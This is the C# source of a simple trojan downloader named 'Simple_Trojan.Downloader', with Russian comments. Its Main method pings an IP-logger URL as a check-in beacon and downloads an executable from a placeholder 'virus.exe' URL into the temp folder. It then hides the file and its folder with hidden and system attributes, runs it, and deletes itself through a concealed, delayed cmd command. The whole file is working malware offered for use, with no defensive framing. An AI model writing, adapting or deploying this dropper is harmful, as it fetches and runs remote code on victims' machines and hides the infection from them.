using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;

namespace Simple_Trojan.Downloader
{
	class Program
	{

		private static bool IPLogger_action(string url)
		{
			try
			{
				//не забываем: using System.Net;
				using (WebClient webClient = new WebClient()) //создаем объект webClient
					using (webClient.OpenRead(url)) //Пытаемся получить html код страницы
						return true; //получли
			}
			catch { return false;  } //не получили
		}

		private static void DownloadFile(string download_url, string save_path)
		{
			try
			{
				//не забываем: using System.IO;
				new WebClient().DownloadFile(download_url, save_path); //скачивает файл
				File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System); //установка скрытого аттрибута на файл
				File.SetAttributes(save_path.Split('\\')[save_path.Split('\\').Length - 2], FileAttributes.Directory |
					FileAttributes.Hidden | FileAttributes.System); //установка скрытого аттрибута на папку
				Process.Start(save_path);
			}
			catch { }
		}

		private static void SelfDelete()
		{
			try
			{
				//не забываем: using System.Diagnostics; using System.Reflection;
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + 
					new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				}); //выполняет cmd команду на удаление с задежкой в 3
			}
			catch { }
		}

		static void Main()
		{
			IPLogger_action("Your IPLogger"); //Делает запрос на IPLogger для отстука
			DownloadFile("https://google.com/virus.exe", Path.GetTempPath() + "\\virus.exe"); //скачивает в папку %temp% файл
			SelfDelete(); //после запуска и проделаных операций удалеят сам себя
		}
	}
}
